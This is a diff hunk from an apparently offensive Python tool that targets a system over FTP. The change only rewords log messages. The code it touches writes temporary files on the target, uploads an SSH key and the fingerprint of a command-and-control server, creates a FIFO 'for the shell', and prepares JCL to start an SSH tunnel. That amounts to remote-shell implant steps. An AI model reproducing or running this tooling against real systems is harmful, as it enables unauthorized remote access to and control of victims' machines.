@@ -123,21 +123,21 @@ if __name__ == '__main__':
     # Set the temporary filenames for the key, FIFO and known hosts
     # Technically vulnerable to a time of check vs time of use, but makes the
     # code easier to read
-    logging.info('Generate temporary files on the target')
+    logging.info('Generate temporary files')
     ftpkeyname = ftp.gen_random_filename(path=config['temporary_path'])
     ftpfifoname = ftp.gen_random_filename(path=config['temporary_path'])
     ftpknownhosts = ftp.gen_random_filename(path=config['temporary_path'])
 
     # Save the key on the target
-    logging.info('Upload SSH key on the target')
+    logging.info('Upload SSH key')
     ftp.upload_string_as_file(key, ftpkeyname)
 
     # Save the known host file on the target
-    logging.info('Upload host fingerprint on the target')
+    logging.info('Upload host fingerprint')
     ftp.upload_string_as_file(cc_server_fingerprint, ftpknownhosts)
 
     # Create the FIFO for the shell
-    logging.info('Create FIFO on the target')
+    logging.info('Create FIFO')
     mkfifo_step = Template(MKFIFO).substitute(FIFONAME=ftpfifoname)
 
     # Generate the JCL to start the SSH tunnel
